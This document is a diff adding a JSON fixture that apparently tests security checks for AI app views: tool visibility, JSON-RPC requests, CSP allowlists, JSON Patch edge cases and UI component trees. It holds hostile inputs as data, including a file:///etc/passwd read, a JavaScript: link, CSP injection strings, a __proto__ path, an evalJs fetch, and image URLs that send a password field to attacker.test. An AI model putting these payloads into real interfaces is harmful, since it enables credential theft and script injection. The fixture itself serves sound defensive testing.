@@ -1,0 +1,152 @@
+{
+  "visibilityCases": [
+    {},
+    { "v": ["model", "app"] },
+    { "v": ["app"] },
+    { "v": ["app", "app"] },
+    { "v": ["model"] },
+    { "v": [] },
+    { "v": "app" },
+    { "v": ["APP"] }
+  ],
+
+  "tools": [
+    { "name": "list_notes", "server": "notes", "visibility": ["model", "app"] },
+    { "name": "render_board", "server": "notes", "visibility": ["app"] },
+    { "name": "refresh_board", "server": "notes", "visibility": ["app", "app"] },
+    { "name": "delete_project", "server": "notes", "visibility": ["model"] },
+    { "name": "export_notes", "server": "notes" },
+    { "name": "sync_now", "server": "notes", "visibility": "app" },
+    { "name": "archive", "server": "notes", "visibility": [] },
+    { "name": "bulk_edit", "server": "notes", "visibility": ["APP"] },
+    { "name": "transfer_funds", "server": "bank", "visibility": ["app"] },
+    { "name": "list_notes", "server": "bank", "visibility": ["app"] }
+  ],
+
+  "viewRequests": [
+    { "jsonrpc": "2.0", "id": 1, "method": "ui/initialize", "params": { "appCapabilities": {} } },
+    { "jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": { "name": "render_board" } },
+    { "jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": { "name": "refresh_board" } },
+    { "jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": { "name": "delete_project" } },
+    { "jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": { "name": "export_notes" } },
+    { "jsonrpc": "2.0", "id": 6, "method": "tools/call", "params": { "name": "sync_now" } },
+    { "jsonrpc": "2.0", "id": 7, "method": "tools/call", "params": { "name": "transfer_funds" } },
+    { "jsonrpc": "2.0", "id": 8, "method": "resources/list" },
+    { "jsonrpc": "2.0", "id": 9, "method": "resources/read", "params": { "uri": "ui://notes/board" } },
+    { "jsonrpc": "2.0", "id": 10, "method": "resources/read", "params": { "uri": "file:///etc/passwd" } },
+    { "jsonrpc": "2.0", "id": 11, "method": "ui/open-link", "params": { "url": "JavaScript:alert(1)" } },
+    { "jsonrpc": "2.0", "id": 12, "method": "ui/open-link", "params": { "url": "https://notes.example/help" } },
+    { "jsonrpc": "2.0", "id": 13, "method": "sampling/createMessage", "params": {} }
+  ],
+
+  "cspCases": [
+    "https://api.example.com",
+    "https://API.Example.com/v1/",
+    "https://a.example.com; script-src *",
+    "https://a.example.com%3Bscript-src",
+    "https://a.example.com\thttps://evil.example",
+    "'unsafe-eval'",
+    "https://*",
+    "https://*.example.com",
+    "http://insecure.example.com",
+    "data:",
+    "wss://live.example.com"
+  ],
+
+  "patchDoc": { "title": "Board", "arr": [1, 2, 3], "meta": { "a/b": 1, "~1": 2 }, "flag": true, "n": 1, "tags": { "x": 1, "y": 2 } },
+
+  "patchCases": [
+    { "label": "第二个 op 失败", "ops": [{ "op": "replace", "path": "/title", "value": "Board v2" }, { "op": "replace", "path": "/missing", "value": 1 }] },
+    { "label": "test true 对 1", "ops": [{ "op": "test", "path": "/flag", "value": 1 }, { "op": "replace", "path": "/title", "value": "passed" }] },
+    { "label": "test 1 对 1.0", "ops": [{ "op": "test", "path": "/n", "value": 1.0 }] },
+    { "label": "test 对象换了键顺序", "ops": [{ "op": "test", "path": "/tags", "value": { "y": 2, "x": 1 } }] },
+    { "label": "下标 /arr/01", "ops": [{ "op": "replace", "path": "/arr/01", "value": 9 }] },
+    { "label": "下标 /arr/1e0", "ops": [{ "op": "replace", "path": "/arr/1e0", "value": 9 }] },
+    { "label": "键 ~01", "ops": [{ "op": "add", "path": "/meta/~01", "value": 9 }] },
+    { "label": "下标越界 /arr/7", "ops": [{ "op": "add", "path": "/arr/7", "value": 9 }] },
+    { "label": "追加 /arr/-", "ops": [{ "op": "add", "path": "/arr/-", "value": 4 }] },
+    { "label": "__proto__", "ops": [{ "op": "add", "path": "/__proto__/isAdmin", "value": true }] },
+    { "label": "move 进自己的子节点", "ops": [{ "op": "move", "from": "/tags", "path": "/tags/inner" }] }
+  ],
+
+  "catalog": {
+    "catalogId": "https://a2ui.org/specification/v0_9/basic_catalog.json",
+    "components": {
+      "Column": { "props": { "children": "children" } },
+      "Row": { "props": { "children": "children" } },
+      "Card": { "props": { "child": "child" } },
+      "Text": { "props": { "text": "text" } },
+      "Image": { "props": { "url": "url", "alt": "text" } },
+      "TextField": { "props": { "label": "text", "value": "binding" } },
+      "Button": { "props": { "child": "child", "action": "action" } },
+      "Tabs": { "props": { "children": "children" }, "allowedChildren": ["Tab"] },
+      "Tab": { "props": { "title": "text", "child": "child" }, "allowedParents": ["Tabs"] }
+    },
+    "functions": {
+      "formatString": { "allowedCallers": "rendererOrAgent" },
+      "openUrl": { "allowedCallers": "rendererOnly" },
+      "showToast": { "allowedCallers": "agentOnly" }
+    },
+    "urlHosts": ["cdn.example.com"]
+  },
+
+  "trees": {
+    "ok": [
+      { "id": "root", "component": "Column", "children": ["title", "card", "go"] },
+      { "id": "title", "component": "Text", "text": "Weekly board" },
+      { "id": "card", "component": "Card", "child": "img" },
+      { "id": "img", "component": "Image", "url": "https://cdn.example.com/board.png", "alt": "board" },
+      { "id": "go", "component": "Button", "child": "go-label", "action": { "call": "openUrl", "args": { "url": "https://notes.example/board" } } },
+      { "id": "go-label", "component": "Text", "text": { "call": "formatString", "args": { "value": "Open ${/board/name}" } } }
+    ],
+    "streaming": [
+      { "id": "title", "component": "Text", "text": "Weekly board" },
+      { "id": "card", "component": "Card", "child": "title" }
+    ],
+    "missing": [
+      { "id": "root", "component": "Column", "children": ["title", "later"] },
+      { "id": "title", "component": "Text", "text": "Weekly board" }
+    ],
+    "cycle": [
+      { "id": "root", "component": "Column", "children": ["a"] },
+      { "id": "a", "component": "Card", "child": "b" },
+      { "id": "b", "component": "Card", "child": "a" }
+    ],
+    "multiParent": [
+      { "id": "root", "component": "Column", "children": ["a", "b"] },
+      { "id": "a", "component": "Card", "child": "shared" },
+      { "id": "b", "component": "Card", "child": "shared" },
+      { "id": "shared", "component": "Text", "text": "rendered twice?" }
+    ],
+    "catalogViolations": [
+      { "id": "root", "component": "Column", "children": ["x", "tab", "dup", "btn"], "style": { "color": "red" } },
+      { "id": "x", "component": "Marquee", "text": "unknown" },
+      { "id": "tab", "component": "Tab", "title": "T", "child": "tx" },
+      { "id": "tx", "component": "Text", "text": "inside a Tab" },
+      { "id": "dup", "component": "Text", "text": "first" },
+      { "id": "dup", "component": "Text", "text": "second" },
+      { "id": "btn", "component": "Button", "child": "btn-label", "action": { "call": "evalJs", "args": { "code": "fetch('//x')" } } },
+      { "id": "btn-label", "component": "Text", "text": "Run" }
+    ],
+    "tabsOk": [
+      { "id": "root", "component": "Tabs", "children": ["t1"] },
+      { "id": "t1", "component": "Tab", "title": "A", "child": "c" },
+      { "id": "c", "component": "Text", "text": "inside" }
+    ],
+    "exfil": [
+      { "id": "root", "component": "Column", "children": ["pw", "px"] },
+      { "id": "pw", "component": "TextField", "label": "Password", "value": { "path": "/form/password" } },
+      { "id": "px", "component": "Image", "url": { "call": "formatString", "returnType": "string", "args": { "value": "https://attacker.test/p?d=${/form}" } }, "alt": "" }
+    ],
+    "exfilBinding": [
+      { "id": "root", "component": "Column", "children": ["px"] },
+      { "id": "px", "component": "Image", "url": { "path": "/user/avatar" } }
+    ],
+    "exfilLiteral": [
+      { "id": "root", "component": "Column", "children": ["px", "py", "pz"] },
+      { "id": "px", "component": "Image", "url": "https://attacker.test/p.png" },
+      { "id": "py", "component": "Image", "url": "http://cdn.example.com/a.png" },
+      { "id": "pz", "component": "Image", "url": "https://cdn.example.com@attacker.test/a.png" }
+    ]
+  }
+}
